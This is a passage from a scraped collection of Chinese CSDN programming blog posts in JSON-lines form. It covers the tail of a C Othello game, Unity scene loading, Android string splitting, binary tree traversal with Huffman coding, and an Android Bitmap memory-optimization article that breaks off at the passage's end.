//显示棋子状态\n                }\n                else\n                {\n                    //若无效下子次数小于2\n                    if (++SkipPlay < 2)  \n                    {\n                        printf(\"我没位置可走，请你走。\\n\");\n                    }\n                    else\n                    {\n                        printf(\"双方都没地方下子，游戏结束!\");\n                    }\n                }\n            }\n        }\n        //下子数量小于64 且无效下子的次数小于2\n        while (iCount < 64 && SkipPlay < 2);\n        //显示各双方棋子的状况\n        Output(chessboard);  \n        Score[0] = Score[1] = 0;//清空计分变量 \n        //循环统计各单元格黑白棋子的数量\n        for (row = 0; row < 8; row++)\n        {\n            for (col = 0; col < 8; col++)\n            {\n                //统计黑子数 \n                Score[0] += chessboard[row][col] == -1; \n                //统计白子数\n                Score[1] += chessboard[row][col] == 1;               \n            }\n        }\n        printf(\"最终成绩:\\n\");\n        printf(\"AI:%d\\n游戏者:%d\\n\", Score[0], Score[1]);\n        fflush(stdin);  //清空输入缓冲区 \n        printf(\"继续下一局(y/n)？:\");\n        scanf(\"%c\", &select);\n    }while (select == 'y' || select == 'Y');\n    printf(\"Game Over!\\n\");\n    return 0;\n}\n\n运行演示： \n \n \n \n\n\n参考资源：\n\n\n  《零基础学算法》 第三版 戴艳等编  机械工业出版社\n\n\n\n\n代码下载地址\n\n\n  http://download.csdn.net/download/u013553804/9500500 \n  http://pan.baidu.com/s/1o8nbtFG\n\n\n\n\n欢迎关注我的微信个人订阅号 \n \n每天多学一点0.0", "time": "2018_08_14_11_13_06", "link": "https://blog.csdn.net/u013553804/article/details/51228396", "title": "人机对战-黑白棋"}
{"timestamp": "2018_08_14_11_13_09", "desc": "兽人永不为奴！！！联盟狗们，拔剑吧！！！ \n\n\n那个啥，言归正传。\n\n首先看一下Unity的两个加载函数\n\n同步加载 \n：加载完毕新场景才会继续执行别的事 \n \n \n\n异步加载 \n：在后台加载新的场景，在此过程中还可以执行其他的事情 \n  \n\n\n值得注意的是：异步加载虽然在后台加载，但是，因为程序对内存进行大量的操作，所以依然会有一定的卡顿（例如：我叫MT2进入画面）\n\n同步加载比较简单 \n调用函数即可\n\n\n\nApplication.LoadLevel(\"SceneName\");\nApplication.LoadLevel(\"SceneIndex\");\n\n异步加载相对比较麻烦 \n首先，利用NGUI建立一个UISlider组件，将其前景预制件UISlider和显示加载百分比的UILabel \n其次，添加如下代码：\n\n\n\nusing UnityEngine;\nusing System.Collections;\n\npublic class LoadingScene : MonoBehaviour {\n\n    //静态字符串保存要加载的场景名字\n    public static string LoadingName;\n    //静态int类型保存要加载的场景索引\n    public static int LoadIndex;\n\n    //引用UI组件\n    public UISlider slider;\n    public UILabel lable;\n\n    //声明一个异步进度变量\n    AsyncOperation asyn;\n\n\n\n    // Use this for initialization\n    void Start () {\n\n        if (slider == null || lable == null)\n        {\n            Debug.Log(\"Error\");\n        }\n        else \n        {\n            Debug.Log(\"Successful\");\n        }\n\n        //进入这个场景就立即协程加载新场景\n        StartCoroutine(\"BeginLoading\");\n\n    }\n\n    // Update is called once per frame\n    void Update () {\n\n        //更新UI\n        slider.value = asyn.progress;\n        //加载进度\n        lable.text = (slider.value * 100).ToString(\".00\");\n\n    }\n\n    //加载目标场景的函数\n    IEnumerator BeginLoading()\n    {\n        if (LoadingName == null)\n        {\n            asyn = Application.LoadLevelAsync(LoadIndex);\n        }\n        else \n        {\n            asyn = Application.LoadLevelAsync(LoadingName);\n        }\n        yield return asyn;\n    }\n\n\n    //设计一个封装好的静态函数，为了和Unity一致\n    //设计以场景名称和场景索引的静态函数\n\n\n    /// <summary>\n    /// 异步加载函数\n    /// </summary>\n    /// <param name=\"value\">场景名称</param>\n    public static void LoadNewScene(string value)\n    {\n        LoadingName = value;\n        Application.LoadLevel(LoadingName);\n    }\n\n    /// <summary>\n    /// 异步加载函数\n    /// </summary>\n    /// <param name=\"value\">场景索引</param>\n    public static void LoadNewScene(int value)\n    {\n        LoadIndex = value;\n        Application.LoadLevel(LoadIndex);\n    }\n}\n\n\n\n欢迎关注我的微信个人订阅号 \n \n每天多学一点0.0", "time": "2018_08_14_11_13_09", "link": "https://blog.csdn.net/u013553804/article/details/51448505", "title": "异步加载和同步加载Unity加载过度画面"}
{"timestamp": "2018_08_14_11_13_09", "desc": "1 组合逗号String\n\nArrayList<String> collectIds = new ArrayList<>();\nString str = collectIds.toString();\nint len = str.length() - 1;\nString ids = str.substring(1, len).replace(\" \", \"\");//\"keyids\":”1,2,3”\n\n\n2 根据逗号分隔String\n\nString str=\"112,123,123,123\";//根据逗号分隔到List数组中\nString str2=str.replace(\" \", \"\")//去掉所用空格\nList<String> list= Arrays.asList(str2.split(\",\"))\n//list的结果就是[113,123,123,123]", "time": "2018_08_14_11_13_09", "link": "https://blog.csdn.net/chenliguan/article/details/52682856", "title": "Android基础之组合逗号String&根据逗号分隔String"}
{"timestamp": "2018_08_14_11_13_09", "desc": "1 概念\n\n\n\n1.1 二叉树概念\n\n　　 二叉树是一种非常重要的数据结构，它同时具有数组和链表各自的特点：它可以像数组一样快速查找，也可以像链表一样快速添加。但是他也有自己的缺点：删除操作复杂。\n\n\n\n1.2 二叉树分类\n\n（1） 二叉树：二叉树(binary tree)是一棵树是每个结点最多有两个子树的有序树，在使用二叉树的时候，数据并不是随便插入到节点中的。 \n（2） 完全二叉树：若设二叉树的高度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第h层有叶子结点，并且叶子结点都是从左到右依次排布，这就是完全二叉树，如下图 \n \n（3） 满二叉树：除了叶结点外每一个结点都有左右子叶且叶子结点都处在最底层的二叉树，如下图 \n \n（4）哈夫曼树：哈夫曼树是一种带权路径长度最短的二叉树，也称为最优二叉树。下面用一幅图来说明：图b的带权路径长度较小，我们可以证明图b就是哈夫曼树(也称为最优二叉树)。 \n\n\n// 它们的带权路径长度分别为：\n图a： WPL=5*2+7*2+2*2+13*2=54\n图b： WPL=5*3+2*3+7*2+13*1=48\n\n1.3 二叉树的特点总结：\n\n\n树执行查找、删除、插入的时间复杂度都是O(logN)；\n遍历二叉树的方法包括前序、中序、后序；\n非平衡树指的是根的左右两边的子节点的数量不一致；\n在非空二叉树中，第i层的结点总数不超过 ， i>=1；\n深度为h的二叉树最多有个结点(h>=1)，最少有h个结点；\n对于任意一棵二叉树，如果其叶结点数为N0，而度数为2的结点总数为N2，则N0=N2+1。\n\n\n2 哈夫曼树\n\n\n\n2.1 如何构建哈夫曼树\n\n\n\n2.1.1 一般可以按下面步骤构建\n\n（1）将所有左，右子树都为空的作为根节点。 \n（2）在森林中选出两棵根节点的权值最小的树作为一棵新树的左，右子树，且 \n置新树的附加根节点的权值为其左，右子树上根节点的权值之和。 \n注意，左子树的权值应小于右子树的权值。 \n（3）从森林中删除这两棵树，同时把新树加入到森林中。 \n（4）重复2，3步骤，直到森林中只有一棵树为止，此树便是哈夫曼树。\n\n\n\n2.1.2 下面是构建哈夫曼树的图解过程\n\n\n\n\n\n2.2 哈夫曼（Huffman）编码\n\n　　利用哈夫曼树求得的用于通信的二进制编码称为哈夫曼编码。树中从根到每个叶子节点都有一条路径，对路径上的各分支约定指向左子树的分支表示”0”码，指向右子树的分支表示“1”码，取每条路径上的“0”或“1”的序列作为各个叶子节点对应的字符编码，即是哈夫曼编码。 \n　　就拿上图例子来说：A，B，C，D对应的哈夫曼编码分别为：111，10，110，0，用图说明如下： \n \n　　注意：设计电文总长最短的二进制前缀编码，就是以n个字符出现的频率作为权构造一棵哈夫曼树，由哈夫曼树求得的编码就是哈夫曼编码。\n\n\n\n2.3 应用\n\n　　为使不等长编码为前缀编码(即要求一个字符的编码不能是另一个字符编码的前缀)，可用字符集中的每个字符作为叶子结点生成一棵编码二叉树，为了获得传送报文的最短长度，可将每个字符的出现频率作为字符结点的权值赋予该结点上，显然字使用频率越小权值越小，权值越小叶子就越靠下，于是频率小编码长，频率高编码短，这样就保证了此树的最小带权路径长度效果上就是传送报文的最短长度。因此，求传送报文的最短长度问题转化为求由字符集中的所有字符作为叶子结点，由字符出现频率作为其权值所产生的哈夫曼树的问题。利用哈夫曼树来设计二进制的前缀编码，既满足前缀编码的条件，又保证报文编码总长最短。\n\n\n\n3 图例演示\n\n\n\n3.1 二叉树\n\n\n\n\n\n3.2 二叉树的遍历\n\n　　二叉树的遍历是指从根节点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点被访问一次且仅被访问一次。二叉树的遍历方式有很多，主要有：前序遍历，中序遍历，后序遍历。 \n（1）前序遍历：若二叉树为空，则空操作返回；否则根左右：先访问根节点，然后前序遍历左子树，再前序遍历右子树。 \n \n（2）中序遍历：若树为空，则空操作返回；否则左根右：从根节点开始（注意并不是先访问根节点），中序遍历根节点的左子树，然后是访问根节点，最后中序遍历右子树。可以看到，如果是二叉排序树，中序遍历的结果就是个有序序列。 \n \n（3）后序遍历：若树为空，则空操作返回；否则左右根先遍历左子树，再遍历右子树，最后访问根结点。在遍历左、右子树时，仍然先遍历左子树，然后遍历右子树，最后遍历根结点。 \n \n图片来源于：数据结构(二)之二叉树\n\n4 二叉树遍历源码\n\n\n\npackage Tree;\npublic class BinaryTree {\n    private TreeNode root = null;\n    public static String[] str;\n    public static int count;\n\n    public BinaryTree() {\n        root = new TreeNode(1, \"A\");\n    }\n\n    /**\n     * 构建二叉树 A B C D E F\n     */\n    public void createBinaryTree() {\n        TreeNode nodeB = new TreeNode(2, \"B\");\n        TreeNode nodeC = new TreeNode(3, \"C\");\n        TreeNode nodeD = new TreeNode(4, \"D\");\n        TreeNode nodeE = new TreeNode(5, \"E\");\n        TreeNode nodeF = new TreeNode(6, \"F\");\n        root.leftChild = nodeB;\n        root.rightChild = nodeC;\n        nodeB.leftChild = nodeD;\n        nodeB.rightChild = nodeE;\n        nodeC.rightChild = nodeF;\n    }\n\n    /**\n     * 根据前序序列递归构建二叉树\n     */\n    public TreeNode createBinaryTree(ArrayList<String> data) {\n        return createBinaryTree(data.size(),data);\n    }\n\n    public TreeNode createBinaryTree(int size, ArrayList<String> data) {\n        if (data.size() == 0) {\n            return null;\n        }\n        String d = data.get(0);\n        TreeNode node = null;\n        int index = size - data.size();//获取节点下标\n        if (d.equals(\"#\")) {\n            node = null;\n            data.remove(0);// 删除“#”\n            return node;//退出\n        }\n        node = new TreeNode(index, d);// 创建新节点\n        if (index == 0) {\n            root = node;// 创建根节点\n        }\n        data.remove(0);\n        node.leftChild = createBinaryTree(size, data);\n        node.rightChild = createBinaryTree(size, data);\n        return node;\n    }\n\n    /**\n     * 求二叉树的高度\n     */\n    public int getHeight() {\n        return getHeight(root);\n    }\n\n    private int getHeight(TreeNode node) {\n        if (node == null) {\n            return 0;\n        } else {\n            int i = getHeight(node.leftChild);\n            int j = getHeight(node.rightChild);\n            return (i < j) ? j + 1 : i + 1;\n        }\n    }\n\n    /**\n     * 获取二叉树的结点数\n     */\n    public int getSize() {\n        return getSize(root);\n    }\n\n    private int getSize(TreeNode node) {\n        if (node == null) {\n            return 0;\n        } else {\n            return 1 + getSize(node.leftChild) + getSize(node.rightChild);\n        }\n    }\n\n    /**\n     * 前序遍历——迭代\n     * \n     * 规则是若二叉树为空，则空操作返回;否则先访问根结点，然后前序遍历左子树，再前序遍历右子树（根左右）\n     */\n    public void preOrder(TreeNode node) {\n        if (node == null) {\n            return;\n        } else {\n            System.out.println(\"前序遍历——迭代:\" + node.getData());\n            preOrder(node.leftChild);\n            preOrder(node.rightChild);\n        }\n    }\n\n    /**\n     * 中序遍历——迭代\n     * \n     * 规则是若树为空，则空操作返回，否则从根结点开始（注意并不是先访问根结点），中序遍历根结点的左子树，然后是访问根结点，最后中序遍历右子树（左根右）\n     */\n    public void midOrder(TreeNode node) {\n        if (node == null) {\n            return;\n        } else {\n            midOrder(node.leftChild);\n            System.out.println(\"中序遍历——迭代:\" + node.getData());\n            midOrder(node.rightChild);\n        }\n    }\n\n    /**\n     * 后序遍历——迭代\n     * \n     * 规则是若树为空，则空操作返回，否则从左到右先叶子后结点的方式遍历访问左右子树，最后是访问根结点（左到右先叶子后结点）\n     */\n    public void postOrder(TreeNode node) {\n        if (node == null) {\n            return;\n        } else {\n            postOrder(node.leftChild);\n            postOrder(node.rightChild);\n            System.out.println(\"后序遍历——迭代:\" + node.getData());\n        }\n    }\n\n    /**\n     * 前序遍历——非迭代\n     */\n    public void theFirstTraversal_Stack(TreeNode root) { // 先序遍历\n        Stack<TreeNode> stack = new Stack<TreeNode>();\n        TreeNode node = root;\n        while (node != null || stack.size() > 0) { // 将所有左孩子压栈\n            if (node != null) { // 压栈之前先访问\n                System.out.println(\"前序遍历——非迭代:\" + node.getData());\n                stack.push(node);\n                node = node.leftChild;\n            } else {\n                node = stack.pop();\n                node = node.rightChild;\n            }\n        }\n    }\n\n    /**\n     * 中序遍历——非迭代\n     */\n    public void theInOrderTraversal_Stack(TreeNode root) { // 中序遍历\n        Stack<TreeNode> stack = new Stack<TreeNode>();\n        TreeNode node = root;\n        while (node != null || stack.size() > 0) {\n            if (node != null) {\n                stack.push(node); // 直接压栈\n                node = node.leftChild;\n            } else {\n                node = stack.pop(); // 出栈并访问\n                System.out.println(\"中序遍历——非迭代:\" + node.getData());\n                node = node.rightChild;\n            }\n        }\n    }\n\n    /**\n     * 后序遍历——非迭代\n     */\n    public void thePostOrderTraversal_Stack(TreeNode root) { // 后序遍历\n        Stack<TreeNode> stack = new Stack<TreeNode>();\n        Stack<TreeNode> output = new Stack<TreeNode>();// 构造一个中间栈来存储逆后序遍历的结果\n        TreeNode node = root;\n        while (node != null || stack.size() > 0) {\n            if (node != null) {\n                output.push(node);\n                stack.push(node);\n                node = node.rightChild;// 遍历右子树\n            } else {\n                node = stack.pop();\n                node = node.leftChild;// 遍历左子树\n            }\n        }\n        while (output.size() > 0) {\n            System.out.println(\"后序遍历——非迭代:\" + output.pop().getData());\n        }\n    }\n\n    public class TreeNode {\n        private int index;\n        private String data;\n        private TreeNode leftChild;\n        private TreeNode rightChild;\n        private TreeNode parent;\n\n        public int getIndex() {\n            return index;\n        }\n        public void setIndex(int index) {\n            this.index = index;\n        }\n        public String getData() {\n            return data;\n        }\n        public void setData(String data) {\n            this.data = data;\n        }\n        public TreeNode getLeftChild() {\n            return leftChild;\n        }\n        public void setLeftChild(TreeNode leftChild) {\n            this.leftChild = leftChild;\n        }\n        public TreeNode getRightChild() {\n            return rightChild;\n        }\n        public void setRightChild(TreeNode rightChild) {\n            this.rightChild = rightChild;\n        }\n        public TreeNode getParent() {\n            return parent;\n        }\n        public void setParent(TreeNode parent) {\n            this.parent = parent;\n        }\n\n        public TreeNode(int index, String data) {\n            this.index = index;\n            this.data = data;\n            this.leftChild = null;\n            this.rightChild = null;\n        }\n    }\n\n    public static void main(String[] args) {\n//      BinaryTree binaryTree = new BinaryTree();\n//      binaryTree.createBinaryTree();\n\n        ArrayList<String> data = new ArrayList<>();\n        String[] dataArray = new String[]{\"A\",\"B\",\"D\",\"#\",\"#\",\"E\",\"#\",\"#\",\"C\",\"#\",\"F\",\"#\",\"#\"}; \n        for(String d:dataArray){ \n            data.add(d);\n        }\n        BinaryTree binaryTree = new BinaryTree();\n        binaryTree.createBinaryTree(data);//创建二叉树\n\n        int height = binaryTree.getHeight();//求二叉树的高度\n        System.out.println(\"treeHeihgt:\" + height);\n\n        int size = binaryTree.getSize();//获取二叉树的结点数\n        System.out.println(\"treeSize:\" + size);\n\n//       binaryTree.preOrder(binaryTree.root);//前序遍历-迭代\n        // binaryTree.midOrder(binaryTree.root);//中序遍历-迭代\n        // binaryTree.postOrder(binaryTree.root);//后序遍历-迭代\n\n        binaryTree.theFirstTraversal_Stack(binaryTree.root);// 前序遍历-非迭代\n        System.out.println(\"\\n\");\n        binaryTree.theInOrderTraversal_Stack(binaryTree.root);// 中序遍历-非迭代\n        System.out.println(\"\\n\");\n        binaryTree.thePostOrderTraversal_Stack(binaryTree.root);// 后序遍历-非迭代\n    }\n}\n\n\n\n5 参考链接\n\n数据结构(二)之二叉树\n\njava版的二叉树的先序遍历、中序遍历以及后序遍历(递归以及非递归方式)\n\nJava实现二叉树的创建、递归/非递归遍历\n\n数据结构和算法系列16 哈夫曼树", "time": "2018_08_14_11_13_09", "link": "https://blog.csdn.net/chenliguan/article/details/52956292", "title": "数据结构与算法之二叉树+遍历+哈夫曼树"}
{"timestamp": "2018_08_14_11_13_09", "desc": "在Android开发过程中，Bitmap往往会给开发者带来一些困扰，因为对Bitmap操作不慎，就容易造成OOM(Java.lang.OutofMemoryError - 内存溢出)，本篇博客，我们将一起探讨Bitmap的性能优化。\n\n\n\n为什么Bitmap会导致OOM？\n\n1.每个机型在编译ROM时都设置了一个应用堆内存VM值上限dalvik.vm.heapgrowthlimit，用来限定每个应用可用的最大内存，超出这个最大值将会报OOM。这个阀值，一般根据手机屏幕dpi大小递增，dpi越小的手机，每个应用可用最大内存就越低。所以当加载图片的数量很多时，就很容易超过这个阀值，造成OOM。\n\n2.图片分辨率越高，消耗的内存越大，当加载高分辨率图片的时候，将会非常占用内存，一旦处理不当就会OOM。例如，一张分辨率为：1920x1080的图片。如果Bitmap使用 ARGB_8888 32位来平铺显示的话，占用的内存是1920x1080x4个字节，占用将近8M内存，可想而知，如果不对图片进行处理的话，就会OOM。\n\n3.在使用ListView, GridView等这些大量加载view的组件时，如果没有合理的处理缓存，大量加载Bitmap的时候，也将容易引发OOM\n\n\n\nBitmap基础知识\n\n一张图片Bitmap所占用的内存 = 图片长度 x 图片宽度 x 一个像素点占用的字节数 \n而Bitmap.Config，正是指定单位像素占用的字节数的重要参数。 \n\n\n其中，A代表透明度；R代表红色；G代表绿色；B代表蓝色。\n\nALPHA_8 \n表示8位Alpha位图,即A=8,一个像素点占用1个字节,它没有颜色,只有透明度 \nARGB_4444 \n表示16位ARGB位图，即A=4,R=4,G=4,B=4,一个像素点占4+4+4+4=16位，2个字节 \nARGB_8888 \n表示32位ARGB位图，即A=8,R=8,G=8,B=8,一个像素点占8+8+8+8=32位，4个字节 \nRGB_565 \n表示16位RGB位图,即R=5,G=6,B=5,它没有透明度,一个像素点占5+6+5=16位，2个字节\n\n一张图片Bitmap所占用的内存 = 图片长度 x 图片宽度 x 一个像素点占用的字节数\n\n根据以上的算法，可以计算出图片占用的内存，以100*100像素的图片为例\n\n\n\n\n\nBitmapFactory解析Bitmap的原理\n\nBitmapFactory提供的解析Bitmap的静态工厂方法有以下五种：\n\n\n\nBitmap decodeFile(...)\nBitmap decodeResource(...)\nBitmap decodeByteArray(...)\nBitmap decodeStream(...)\nBitmap decodeFileDescriptor(...)\n\n其中常用的三个：decodeFile、decodeResource、decodeStream。 \ndecodeFile和decodeResource其实最终都是调用decodeStream方法来解析Bitmap\n\ndecodeFile方法代码：\n\n\n\n   public static Bitmap decodeFile(String pathName, Options opts) {\n        Bitmap bm = null;\n        InputStream stream = null;\n        try {\n            stream = new FileInputStream(pathName);\n            bm = decodeStream(stream, null, opts);\n        } catch (Exception e) {\n            /*  do nothing.\n                If the exception happened on open, bm will be null.\n            */\n            Log.e(\"BitmapFactory\", \"Unable to decode stream: \" + e);\n        } finally {\n            if (stream != null) {\n                try {\n                    stream.close();\n                } catch (IOException e) {\n                    // do nothing here\n                }\n            }\n        }\n\ndecodeResource方法的代码：\n\n\n\npublic static Bitmap decodeResource(Resources res, int id, Options opts) {\n        Bitmap bm = null;\n        InputStream is = null; \n\n        try {\n            final TypedValue value = new TypedValue();\n            is = res.openRawResource(id, value);\n\n            bm = decodeResourceStream(res, value, is, null, opts);\n        } catch (Exception e) {\n            /*  do nothing.\n                If the exception happened on open, bm will be null.\n                If it happened on close, bm is still valid.\n            */\n        } finally {\n            try {\n                if (is != null) is.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n\n        if (bm == null && opts != null && opts.inBitmap != null) {\n            throw new IllegalArgumentException(\"Problem decoding into existing bitmap\");\n        }\n\n        return bm;\n    }\n\ndecodeStream的逻辑如下：\n\n\n\n public static Bitmap decodeStream(InputStream is, Rect outPadding, Options opts) {\n        // we don't throw in this case, thus allowing the caller to only check\n        // the cache, and not force the image to be decoded.\n        if (is == null) {\n            return null;\n        }\n\n        Bitmap bm = null;\n\n        Trace.traceBegin(Trace.TRACE_TAG_GRAPHICS, \"decodeBitmap\");\n        try {\n            if (is instanceof AssetManager.AssetInputStream) {\n                final long asset = ((AssetManager.AssetInputStream) is).getNativeAsset();\n                bm = nativeDecodeAsset(asset, outPadding, opts);\n            } else {\n                bm = decodeStreamInternal(is, outPadding, opts);\n            }\n\n            if (bm == null && opts != null && opts.inBitmap != null) {\n                throw new IllegalArgumentException(\"Problem decoding into existing bitmap\");\n            }\n\n            setDensityFromOptions(bm, opts);\n        } finally {\n            Trace.traceEnd(Trace.TRACE_TAG_GRAPHICS);\n        }\n\n        return bm;\n    }\n\n\n\nprivate static Bitmap decodeStreamInternal(InputStream is, Rect outPadding, Options opts) {\n        // ASSERT(is != null);\n        byte [] tempStorage = null;\n        if (opts != null) tempStorage = opts.inTempStorage;\n        if (tempStorage == null) tempStorage = new byte[DECODE_BUFFER_SIZE];\n        return nativeDecodeStream(is, tempStorage, outPadding, opts);\n    }\n\n从上面的代码可以看出，decodeStream的代码最终会调用以下两个native方法之一\n\n\n\nnativeDecodeAsset()\nnativeDecodeStream()\n\n这两个native方法只是对应decodeFile和decodeResource、decodeStream来解析的，像decodeByteArray、decodeFileDescriptor也有专门的native方法负责解析Bitmap。\n\ndecodeFile、decodeResource的区别在于他们方法的调用路径不同：\n\n\n\ndecodeFile->decodeStream\ndecodeResource->decodeResourceStream->decodeStream\n\ndecodeResource在解析时多调用了一个decodeResourceStream方法，而这个decodeResourceStream方法代码如下：\n\n\n\npublic static Bitmap decodeResourceStream(Resources res, TypedValue value,\n            InputStream is, Rect pad, Options opts) {\n\n        if (opts == null) {\n            opts = new Options();\n        }\n\n        if (opts.inDensity == 0 && value != null) {\n            final int density = value.density;\n            if (density == TypedValue.DENSITY_DEFAULT) {\n                opts.inDensity = DisplayMetrics.DENSITY_DEFAULT;\n            } else if (density != TypedValue.DENSITY_NONE) {\n                opts.inDensity = density;\n            }\n        }\n\n        if (opts.inTargetDensity == 0 && res != null) {\n            opts.inTargetDensity = res.getDisplayMetrics().densityDpi;\n        }\n\n        return decodeStream(is, pad, opts);\n    }\n\n其中对Options进行处理了，在得到opts.inDensity属性的前提下，如果我们没有对该属性设定值，那么将opts.inDensity = DisplayMetrics.DENSITY_DEFAULT;赋定这个默认的Density值，这个默认值为160，为标准的dpi比例，即在Density=160的设备上1dp=1px，这个方法中还有这么一行\n\nopts.inTargetDensity = res.getDisplayMetrics().densityDpi;\n\n对opts.inTargetDensity进行了赋值，该值为当前设备的densityDpi值，所以说在decodeResourceStream方法中主要做了两件事：\n\n1.对opts.inDensity赋值，没有则赋默认值160 \n2.对opts.inTargetDensity赋值，没有则赋当前设备的densityDpi值\n\n之后参数将传入decodeStream方法，该方法中在调用native方法进行解析Bitmap后会调用这个方法setDensityFromOptions(bm, opts);：\n\n\n\nprivate static void setDensityFromOptions(Bitmap outputBitmap, Options opts) {\n        if (outputBitmap == null || opts == null) return;\n\n        final int density = opts.inDensity;\n        if (density != 0) {\n            outputBitmap.setDensity(density);\n            final int targetDensity = opts.inTargetDensity;\n            if (targetDensity == 0 || density == targetDensity || density == opts.inScreenDensity) {\n                return;\n            }\n\n            byte[] np = outputBitmap.getNinePatchChunk();\n            final boolean isNinePatch = np != null && NinePatch.isNinePatchChunk(np);\n            if (opts.inScaled || isNinePatch) {\n                outputBitmap.setDensity(targetDensity);\n            }\n        } else if (opts.inBitmap != null) {\n            // bitmap was reused, ensure density is reset\n            outputBitmap.setDensity(Bitmap.getDefaultDensity());\n        }\n    }\n\n主要就是把刚刚赋值过的两个属性inDensity和inTargetDensity给Bitmap进行赋值，不过并不是直接赋给Bitmap就完了，中间有个判断，当inDensity的值与inTargetDensity或与设备的屏幕Density不相等时，则将应用inTargetDensity的值，如果相等则应用inDensity的值。\n\n所以总结来说，setDensityFromOptions方法就是把inTargetDensity的值赋给Bitmap，不过前提是opts.inScaled = true；\n\n进过上面的分析，结论如下：\n\n在不配置Options的情况下： \n1.decodeFile、decodeStream在解析时不会对Bitmap进行一系列的屏幕适配，解析出来的将是原始大小的图 \n2.decodeResource在解析时会对Bitmap根据当前设备屏幕像素密度densityDpi的值进行缩放适配操作，使得解析出来的Bitmap与当前设备的分辨率匹配，达到一个最佳的显示效果，并且Bitmap的大小将比原始的大\n\n\n\nBitmap的优化策略\n\n经过上面的分析，我们可以得出Bitmap优化的思路： \n1、BitmapConfig的配置 \n2、使用decodeFile、decodeResource、decodeStream进行解析Bitmap时，配置inDensity和inTargetDensity，两者应该相等,值可以等于屏幕像素密度*0.75f \n3、使用inJustDecodeBounds预判断Bitmap的大小及使用inSampleSize进行压缩 \n4、对Density>240的设备进行Bitmap的适配（缩放Density） \n5、2.3版本inNativeAlloc的使用 \n6、4.4以下版本inPurgeable、inInputShareable的使用 \n7、Bitmap的回收\n\n所以我们根据以上的思路，我们将Bitmap优化的策略总结为以下3种： \n1.对图片质量进行压缩 \n2.对图片尺寸进行压缩 \n3.使用libjpeg.so库进行压缩\n\n\n\n对图片质量进行压缩\n\n\n\n\n        public static Bitmap compressImage(Bitmap bitmap){  \n            ByteArrayOutputStream baos = new ByteArrayOutputStream();  \n            //质量压缩方法，这里100表示不压缩，把压缩后的数据存放到baos中  \n            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);  \n            int options = 100;  \n            //循环判断如果压缩后图片是否大于50kb,大于继续压缩  \n            while ( baos.toByteArray().length / 1024>50) {  \n                //清空baos  \n                baos.reset();  \n                bitmap.compress(Bitmap.CompressFormat.JPEG, options, baos);  \n                options -= 10;//每次都减少10  \n            }  \n            //把压缩后的数据baos存放到ByteArrayInputStream中  \n            ByteArrayInputStream isBm = new ByteArrayInputStream(baos.toByteArray());  \n            //把ByteArrayInputStream数据生成图片  \n            Bitmap newBitmap = BitmapFactory.decodeStream(isBm, null, null);  \n            return newBitmap;  \n        }  \n\n对图片尺寸进行压缩\n\n\n\n    /**\n     * 按图片尺寸压缩 参数是bitmap\n     * @param bitmap\n     * @param pixelW\n     * @param pixelH\n     * @return\n     */\n    public static Bitmap compressImageFromBitmap(Bitmap bitmap, int pixelW, int pixelH) {\n        ByteArrayOutputStream os = new ByteArrayOutputStream();\n        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, os);\n        if( os.toByteArray().length / 1024>512) {//判断如果图片大于0.5M,进行压缩避免在生成图片（BitmapFactory.decodeStream）时溢出\n            os.reset();\n            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, os);//这里压缩50%，把压缩后的数据存放到baos中\n        }\n        ByteArrayInputStream is = new ByteArrayInputStream(os.toByteArray());\n        BitmapFactory.Options options = new BitmapFactory.Options();\n        options.inJustDecodeBounds = true;\n        options.inPreferredConfig = Bitmap.Config.RGB_565;\n        BitmapFactory.decodeStream(is, null, options);\n        options.inJustDecodeBounds = false;\n        options.inSampleSize = computeSampleSize(options , pixelH > pixelW ? pixelW : pixelH ,pixelW * pixelH );\n        is = new ByteArrayInputStream(os.toByteArray());\n        Bitmap newBitmap = BitmapFactory.decodeStream(is, null, options);\n        return newBitmap;\n    }\n\n\n    /**\n     * 动态计算出图片的inSampleSize\n     * @param options\n     * @param minSideLength\n     * @param maxNumOfPixels\n     * @return\n     */\n    public static int computeSampleSize(BitmapFactory.Options options, int minSideLength, int maxNumOfPixels) {\n        int initialSize = computeInitialSampleSize(options, minSideLength, maxNumOfPixels);\n        int roundedSize;\n        if (initialSize <= 8) {\n            roundedSize = 1;\n            while (roundedSize < initialSize) {\n                roundedSize <<= 1;\n            }\n        } else {\n            roundedSize = (initialSize + 7) / 8 * 8;\n        }\n        return roundedSize;\n    }\n\n    private static int computeInitialSampleSize(BitmapFactory.Options options, int minSideLength, int maxNumOfPixels) {\n        double w = options.outWidth;\n        double h = options.outHeight;\n        int lowerBound = (maxNumOfPixels == -1) ? 1 : (int) Math.ceil(Math.sqrt(w * h / maxNumOfPixels));\n        int upperBound = (minSideLength == -1) ? 128 :(int) Math.min(Math.floor(w / minSideLength), Math.floor(h / minSideLength));\n        if (upperBound < lowerBound) {\n            return lowerBound;\n        }\n        if ((maxNumOfPixels == -1) && (minSideLength == -1)) {\n            return 1;\n        } else if (minSideLength == -1) {\n            return lowerBound;\n        } else {\n            return upperBound;\n        }\n    }\n\n\n使用libjpeg.so库进行压缩\n\n除了通过设置simpleSize根据图片尺寸压缩图片和通过Bitmap.compress方法通过压缩图片质量两种方法外，我们还可以使用libjpeg.so这个库来进行压缩。\n\nlibjpeg是广泛使用的开源JPEG图像库，Android所用的是skia的压缩算法，而Skia对libjpeg进行了的封装。  \nlibjpeg在压缩图像时，有一个参数叫optimize_coding，关于这个参数，libjpeg.doc有如下解释：\n\nboolean optimize_coding \nTRUE causes the compressor to compute optimal Huffman coding tables \nfor the image. This requires an extra pass over the data and \ntherefore costs a good deal of space and time. The default is \nFALSE, which tells the compressor to use the supplied or default \nHuffman tables. In most cases optimal tables save only a few percent \nof file size compared to the default tables. Note that when this is \nTRUE, you need not supply Huffman tables at all, and any you do \nsupply will be overwritten.\n\n如果设置optimize_coding为TRUE，将会使得压缩图像过程中基于图像数据计算哈弗曼表，由于这个计算会显著消耗空间和时间，默认值被设置为FALSE。 \n\n谷歌的Skia项目工程师们最终没有设置这个参数，optimize_coding在Skia中默认的等于了FALSE，但是问题就随之出现了，如果我们想在FALSE和TRUE时压缩成相同大小的JPEG 图片，FALSE的品质将大大逊色于TRUE的，尽管谷歌工程师没有将该值设置为true,但是我们可以自己编译libjpeg进行图片的压缩。\n\nlibjpeg的官网下载地址：http://www.ijg.org/ \n从官网下载之后，我们必须自己对其进行编译。\n\n编译libjpeg 